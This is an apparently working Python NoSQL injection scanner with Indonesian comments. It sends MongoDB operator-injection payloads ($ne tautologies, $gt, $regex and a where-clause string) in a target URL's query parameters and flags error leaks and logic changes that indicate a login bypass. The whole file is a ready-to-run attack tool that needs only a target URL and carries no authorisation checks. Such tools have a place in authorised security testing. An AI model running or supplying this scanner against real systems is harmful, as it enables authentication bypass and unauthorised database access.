import requests
import urllib.parse
import copy
import json
from colorama import Fore, Style

class NoSQLHunter:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {'User-Agent': 'ZeroBurst-NoSQLAuditor/46.0'}
        
        self.parsed = urllib.parse.urlparse(target_url)
        self.params = urllib.parse.parse_qs(self.parsed.query)
        self.base_url = target_url.split("?")[0]
        
        # Database Error Signatures (MongoDB/CouchDB)
        self.errors = [
            "MongoError",
            "mongo-express",
            "Tatsuya", # MongoDB admin GUI error
            "Cast to ObjectId failed",
            "JSON.parse",
            "SyntaxError: Unexpected token"
        ]

    def generate_payloads(self):
        """
        Menghasilkan payload NoSQL Injection (Operator Injection).
        Fokus pada MongoDB (target paling umum).
        """
        payloads = []
        
        # 1. Tautology Bypass (Authentication Bypass Vector)
        # Logika: username[$ne]=null (Username tidak sama dengan null -> True)
        # Sering tembus pada login Node.js yang tidak validasi tipe data.
        payloads.append({'type': 'Not Equal ($ne) Injection', 'key_suffix': '[$ne]', 'val': 'null'})
        payloads.append({'type': 'Not Equal ($ne) String', 'key_suffix': '[$ne]', 'val': 'randomstring123'})
        
        # 2. Greater Than ($gt)
        # Logika: price[$gt]=0
        payloads.append({'type': 'Greater Than ($gt) Injection', 'key_suffix': '[$gt]', 'val': ''})
        
        # 3. Regex Injection ($regex)
        # Logika: username[$regex]=^adm
        payloads.append({'type': 'Regex ($regex) Injection', 'key_suffix': '[$regex]', 'val': '.*'})
        
        # 4. JavaScript Injection ($where) - Classic Blind
        # Hati-hati: Ini sering diblokir
        payloads.append({'type': 'Where Clause Injection', 'key_suffix': '', 'val': '\'||1==1//'})

        return payloads

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: NoSQL Injection Auditor (MongoDB Focus){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.target}")
        
        if not self.params:
            print(f"{Fore.RED}[!] No parameters found. NoSQLi scan needs inputs.{Style.RESET_ALL}")
            return

        # 1. Baseline Request
        try:
            base_res = self.session.get(self.target, timeout=8)
            base_len = len(base_res.text)
            base_code = base_res.status_code
        except:
            print(f"{Fore.RED}[!] Connection Error.{Style.RESET_ALL}")
            return

        payload_list = self.generate_payloads()
        print(f"{Fore.YELLOW}[+] Testing {len(payload_list)} NoSQL operators per parameter...{Style.RESET_ALL}")

        total_vulns = 0

        for param, values in self.params.items():
            print(f"\n{Fore.WHITE}>>> Inspecting Parameter: {Fore.GREEN}'{param}'{Style.RESET_ALL}")
            original_val = values[0]
            
            for p in payload_list:
                # Construct Malicious URL
                # Kita memanipulasi nama parameter untuk menyisipkan operator array
                # Contoh: ?user=admin  MENJADI  ?user[$ne]=random
                
                # Copy params asli
                # Hapus param target yang lama, ganti dengan yang sudah dimutasi
                attack_params = []
                for k, v in self.params.items():
                    if k == param:
                        # Inject Operator
                        new_key = f"{k}{p['key_suffix']}"
                        attack_params.append(f"{new_key}={p['val']}")
                    else:
                        attack_params.append(f"{k}={v[0]}")
                
                query_string = "&".join(attack_params)
                attack_url = f"{self.base_url}?{query_string}"
                
                try:
                    res = self.session.get(attack_url, timeout=8)
                    
                    # ANALISIS KERENTANAN
                    
                    # 1. Error Based
                    for err in self.errors:
                        if err in res.text:
                            print(f"   {Fore.RED}[VULNERABLE] NoSQL Error Leaked! ({err}){Style.RESET_ALL}")
                            print(f"   ├── Payload: {Fore.YELLOW}{attack_url}{Style.RESET_ALL}")
                            total_vulns += 1
                            break
                    
                    # 2. Boolean/Logic Based
                    # Jika kita kirim $ne (Not Equal) random, dan server merespon beda dengan Baseline
                    # (Misal: Login berhasil, atau konten berubah drastis)
                    
                    # Jika payload adalah Tautology ($ne) dan respon berubah signifikan ATAU jadi 200 OK dari 401
                    if p['type'] == 'Not Equal ($ne) Injection':
                        # Jika baseline gagal (misal login page), tapi injeksi ini menghasilkan length beda
                        # atau redirect, kemungkinan Bypass berhasil.
                        if res.status_code != base_code or abs(len(res.text) - base_len) > 200:
                            print(f"   {Fore.RED}[CRITICAL] Logic Bypass Detected ($ne)!{Style.RESET_ALL}")
                            print(f"   ├── Payload : {attack_url}")
                            print(f"   ├── Change  : Status {base_code}->{res.status_code} | Len {base_len}->{len(res.text)}")
                            total_vulns += 1

                except Exception as e:
                    pass

        print("-" * 60)
        if total_vulns > 0:
            print(f"{Fore.RED}[!!!] SCAN COMPLETE: {total_vulns} potential NoSQL Injection vectors found.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[OK] Target handled NoSQL operators safely.{Style.RESET_ALL}")

def run_nosql_scan(url):
    engine = NoSQLHunter(url)
    engine.run_scan()